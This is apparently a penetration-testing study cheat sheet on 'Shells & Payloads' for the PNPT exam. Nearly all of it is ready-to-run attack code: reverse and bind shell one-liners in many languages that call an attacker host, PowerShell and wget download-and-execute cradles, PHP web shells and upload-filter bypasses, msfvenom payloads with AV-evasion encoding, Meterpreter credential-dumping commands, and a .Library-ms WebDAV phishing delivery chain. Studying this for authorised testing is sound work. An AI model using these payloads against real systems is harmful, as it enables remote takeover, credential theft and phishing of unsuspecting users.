# Shells & Payloads

How you turn code execution into an interactive session, and how you make that session usable. Every foothold on the PNPT — a web RCE, an exploited service, a phishing payload — lands you here first. Get a stable shell, upgrade it to a real TTY, then move on to enumeration, [privesc](linux-privesc-methodology.md), and [credential dumping](credential-dumping.md).

{% hint style="warning" %}
Set up your listener **before** you fire the payload. A reverse shell that connects back to a closed port dies silently and you'll waste time wondering why the exploit "failed". Confirm the listener is bound (`ss -tlnp`) first.
{% endhint %}

## Reverse vs bind — which way does the connection go?

| Type | Who listens | Who connects | Use when |
| --- | --- | --- | --- |
| **Reverse** | Attacker | Target dials back | Target is behind NAT / firewalls outbound is open (the common case) |
| **Bind** | Target | Attacker connects in | Target is directly reachable and you can't get an outbound callback |

## Listener setup

```bash
nc -lvnp <LPORT>                                    # plain
rlwrap nc -lvnp <LPORT>                             # arrow keys + history (preferred)
socat file:`tty`,raw,echo=0 TCP-L:<LPORT>           # fully interactive
ncat --ssl -vv -l -p <LPORT>                        # SSL
stty raw -echo; (stty size; cat) | nc -lvnp <LPORT> # for ConPtyShell (fully interactive Windows)
```

```
# Metasploit multi/handler
use multi/handler
set payload <payload>
set LHOST <ATTACKER_IP>
set LPORT <LPORT>
run          # or: exploit -j  (background job)
```

## Reverse shells by language

The universal fallbacks. Pick the interpreter the target actually has.

### Bash

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1
0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<LPORT>; sh <&196 >&196 2>&196
```

### Bash UDP

```bash
sh -i >& /dev/udp/<ATTACKER_IP>/<LPORT> 0>&1        # victim
nc -u -lvp <LPORT>                                   # listener
```

### Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
# Windows Python3
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('<ATTACKER_IP>',<LPORT>));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
# Nishang download cradle
powershell IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <LPORT>

# ConPtyShell — fully interactive on Win10+/Server2019+ (listener: stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>)
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> <LPORT>
```

### PHP

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<ATTACKER_IP>",<LPORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl

```perl
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Other interpreters

```bash
# Lua (Linux)
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ATTACKER_IP>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Awk
awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/<LPORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<ATTACKER_IP>:<LPORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

# NodeJS
require('child_process').exec('nc -e /bin/sh <ATTACKER_IP> <LPORT>')
```

### Netcat variants

```bash
nc -e /bin/sh <ATTACKER_IP> <LPORT>                                              # traditional (has -e)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LPORT> >/tmp/f   # OpenBSD (no -e)
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LPORT> >/tmp/f  # BusyBox
```

### Socat (upgrade-in-one-shot)

```bash
# Attacker
socat file:`tty`,raw,echo=0 TCP-L:<LPORT>
# Victim — fully interactive from the start
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<LPORT>
# One-liner: fetch static socat then connect
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<LPORT>
```

### OpenSSL (encrypted)

```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>
# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<LPORT> > /tmp/s; rm /tmp/s
```

{% hint style="info" %}
[revshells.com](https://www.revshells.com/) generates any of these with your IP/port filled in and the right URL-encoding for the delivery context. Great under exam time pressure — but understand the payload before you paste it.
{% endhint %}

## Bind shells

The target listens; you connect in.

```bash
nc -nlvp <BIND_PORT> -e /bin/bash                                               # traditional
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <BIND_PORT> >/tmp/f # OpenBSD
nc -nvlp <BIND_PORT> -e cmd.exe                                                  # Windows
socat TCP-LISTEN:<BIND_PORT>,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
# Attacker connects
nc -nv <TARGET> <BIND_PORT>
```

```powershell
# Powercat (PowerShell netcat)
. .\powercat.ps1
powercat -l -p <BIND_PORT> -ep                                                   # target listens
powercat -c <TARGET> -p <BIND_PORT>                                              # attacker connects

# Powercat one-shot reverse via download cradle (no disk touch)
IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p <LPORT> -e powershell
```

## Upgrade a dumb shell to a real TTY

Do this on every Linux shell before real work — you get arrows, tab-complete, and working Ctrl-C.

```bash
# Step 1: spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: background it — press Ctrl+Z

# Step 3: note your terminal size and set raw mode
echo $TERM && stty size          # remember rows/cols
stty raw -echo; fg               # then press Enter twice

# Step 4: fix the environment
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows <ROWS> cols <COLS>     # match the size from step 3
```

{% hint style="danger" %}
Enumerate SUID / `getcap` / `sudo -l` **before** the PTY upgrade — on some boxes `pty.spawn` runs in a namespace-mount-restricted context that hides binaries from `find`.
{% endhint %}

Other PTY spawns when Python isn't present:

```bash
/usr/bin/script -qc /bin/bash /dev/null      # works when su needs a terminal
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

WSL/tmux Ctrl+Z workaround:

```bash
tmux
nc -lnvp <LPORT>
# Ctrl+B, C for a new window, then:
ps aux | grep nc
kill -s TSTP <NC_PID>            # switch back to the nc window
```

## Web shells

When you have file upload or write-to-webroot but no direct execution.

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

```bash
http://<TARGET>/shell.php?cmd=id           # usage

# Prebuilt shells on Kali/Parrot
/usr/share/webshells/           # php, asp, aspx, jsp, cfm
/usr/share/laudanum/            # Laudanum (edit allowedIps to your IP)
/usr/share/nishang/Antak-WebShell/  # Antak ASPX (edit credentials first)
/usr/share/seclists/Web-Shells/
```

Deploy a WAR/JSP shell to Tomcat:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f war > shell.war
curl --upload-file shell.war -u '<USER>:<PASS>' "http://<TARGET>:8080/manager/text/deploy?path=/shell"
curl http://<TARGET>:8080/shell/
```

### Upload filter bypasses

```
shell.php.jpg          # double extension
shell.php%00.jpg       # null byte (older PHP)
shell.pHp              # case variation
shell.php5 / .phtml    # alternative PHP extensions
```

## MSFVenom payload generation

### Staged vs stageless

```
Staged:    windows/meterpreter/reverse_tcp   (/ between stager and stage)
           - Smaller initial payload, pulls the stage from the handler — needs multi/handler
Stageless: windows/meterpreter_reverse_tcp   (_ fused — self-contained)
           - Larger, works with a plain nc/ncat listener
```

### Common payloads

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f exe -o m.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f dll -o shell.dll
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f msi -o shell.msi   # msiexec /i shell.msi /quiet /qn /norestart

# Web
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f aspx > shell.aspx
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f war > shell.war

# Scripting
msfvenom -p cmd/unix/reverse_python LHOST=<ATTACKER_IP> LPORT=<LPORT> -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=<LPORT> -f raw > shell.sh
```

### Flag reference

| Flag | Purpose |
| --- | --- |
| `-p` | Payload |
| `-f` | Output format (elf, exe, dll, msi, aspx, asp, jsp, war, raw, py, php, macho) |
| `-o` | Output file |
| `-a` / `--platform` | Architecture / target platform |
| `-e` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i` | Encoding iterations |
| `-b` | Bad characters to avoid (e.g. `"\x00"`) |
| `-x` / `-k` | Template binary / keep template behavior |
| `LHOST` / `LPORT` | Listener IP / port |

### Encoding & evasion

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -b "\x00" -f python
```

Evasion reality check: encoders are **not** encryption. Modern AV uses behavior analysis and ML, default MSFVenom output is widely signatured, and packers (UPX, Themida) have known signatures. For a monitored engagement, expect to obfuscate or go fileless.

## Meterpreter quick reference

```
getuid / sysinfo             # who am I, what host
shell                        # drop to OS shell
background / bg              # background this session
sessions -i <ID>             # interact with a session
migrate <PID>                # move into another process
ps                           # list processes

# File system
download <file> / upload <file>
cat <file> / ls / cd <path>

# Post-exploitation
hashdump                     # dump password hashes
load kiwi                    # load Mimikatz extension
getsystem                    # attempt SYSTEM
use post/multi/recon/local_exploit_suggester   # find privesc exploits
```

## Field notes (things that bite under exam pressure)

* **ELF fails silently?** Some contexts (Java `Runtime.exec()`, MDA subshells) break small ELF reverse shells even when they transfer cleanly. Switch to `cmd/unix/reverse_bash` (bash handles stdio inheritance predictably) or a Python one-liner.
* **Egress ports:** test which outbound ports are open before wondering why a shell hangs. Common winners: 80, 443, 21, 53.

```bash
for p in 80 443 4444 21 53 8000 8080; do
  timeout 3 bash -c "echo > /dev/tcp/<ATTACKER_IP>/$p" 2>/dev/null && echo "$p OPEN"
done
```

* **Payload vs firewall diagnosis:** `sudo tcpdump -i tun0 -n 'src host <TARGET>'` — a SYN means the payload fired and the firewall dropped the callback (change port); no SYN means the payload didn't run (change payload).
* **Stateless webshells** (`.phar`, one-shot PHP) tear down the process after each request, so `bash -c '/dev/tcp/...'` dies instantly. `socat exec:'bash -li',pty,setsid,sane tcp:<ATTACKER_IP>:<LPORT>` survives.

## Client-side delivery: `.Library-ms` + WebDAV

`.Library-ms` XML files mount a referenced URL over WebDAV when double-clicked. Ship one to a user, they double-click, Explorer auto-mounts your Kali WebDAV share, and a `.lnk` you dropped there becomes a one-click reverse-shell trigger.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation><url>http://<ATTACKER_IP></url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Serve the WebDAV share (see [File Transfers](file-transfers.md)) and drop a `.lnk` in it whose target is the powercat cradle above.

## Workflow

```
# 1. Start the listener (rlwrap nc -lvnp <LPORT>) BEFORE firing anything
# 2. Deliver the language-appropriate reverse shell (or msfvenom payload)
# 3. Catch the callback → immediately upgrade to a full TTY
# 4. Fix TERM/rows/cols so tools render correctly
# 5. Enumerate for privesc, THEN escalate, THEN dump credentials
# 6. On a monitored engagement: prefer fileless / encrypted / non-4444 ports
```

## Related

* [File Transfers](file-transfers.md) — stage payloads and serve the WebDAV/`.Library-ms` chain
* [Windows Privesc](windows-privesc-methodology.md) · [Linux Privesc](linux-privesc-methodology.md) — the next step after a stable shell
* [Credential Dumping](credential-dumping.md) — harvest creds once you've escalated
* [Lateral Movement](lateral-movement.md) — turn a shell on one host into shells everywhere
* [Pivoting & Tunneling](pivoting-tunneling.md) — route reverse shells back through a pivot listener
* [AD Attacks](ad-attacks.md) — where a domain foothold shell leads
* [Report Writing](report-writing.md) — document the initial-access vector and payload used
